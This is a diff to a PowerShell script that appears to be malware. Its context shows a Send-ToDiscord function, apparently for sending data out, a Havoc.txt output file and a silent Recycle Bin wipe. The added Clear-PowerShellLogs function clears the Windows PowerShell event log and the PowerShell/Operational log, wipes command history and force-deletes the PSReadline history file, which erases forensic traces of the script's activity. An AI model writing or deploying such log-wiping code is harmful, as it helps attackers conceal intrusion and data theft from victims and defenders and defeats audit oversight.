@@ -408,6 +408,19 @@ function Send-ToDiscord {
     }
 }
 
+function Clear-PowerShellLogs {
+    if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue) {
+        Clear-EventLog -LogName "Windows PowerShell"
+    }
+    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+    Clear-History
+
+    $historyPath = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path $historyPath) {
+        Remove-Item $historyPath -Force
+    }
+}
+
 function Main {
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
     $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
@@ -447,6 +460,7 @@ function Main {
     $targetFileDownloadsMessage = Join-Path -Path $downloadsPath -ChildPath "message.txt"
 
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+    Clear-PowerShellLogs
 }
 
 
